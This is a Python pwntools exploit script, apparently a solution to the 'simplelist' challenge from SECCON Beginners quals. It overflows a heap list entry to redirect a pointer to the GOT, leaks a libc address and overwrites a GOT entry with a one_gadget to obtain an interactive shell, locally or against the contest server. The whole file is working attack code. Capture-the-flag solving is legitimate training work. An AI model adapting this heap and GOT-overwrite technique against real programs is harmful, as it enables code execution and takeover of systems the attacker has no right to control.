from pwn import *

sendlineafter = lambda p, x, y: p.sendlineafter(x, y)
sendline = lambda p, x: p.sendline(x)
send = lambda p, x: p.send(x)

filepath = './chall'
e = context.binary = ELF(filepath, checksec=False)
if args.REMOTE:
    p = remote('simplelist.quals.beginners.seccon.jp', 9003)
    libc = ELF('./libc-2.33.so')
    one_gadget = [0xde78c, 0xde78f, 0xde792]
else:
    p = process(filepath)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = [0xe3b2e, 0xe3b31, 0xe3b34]

def create(s):
    sendlineafter(p, b'> ', b'1')
    sendlineafter(p, b'Content: ', s)

def edit(i, s):
    sendlineafter(p, b'> ', b'2')
    sendlineafter(p, b'index: ', str(i).encode())
    sendlineafter(p, b'New content: ', s)

create(b'A')
create(b'B')
edit(0, b'A'*0x20+p64(0x31)+p64(e.got['read']))
sendlineafter(p, b'> ', b'2')
sendlineafter(p, b'index: ', b'2')
p.recvuntil(b'Old content: ')
libc.address = u64(p.recvline()[:-1].ljust(8, b'\0')) - libc.symbols['gets']
log.info('libc: ' + hex(libc.address))
sendlineafter(p, b'New content: ', p64(one_gadget[1] + libc.address))
create(b'')
p.interactive()
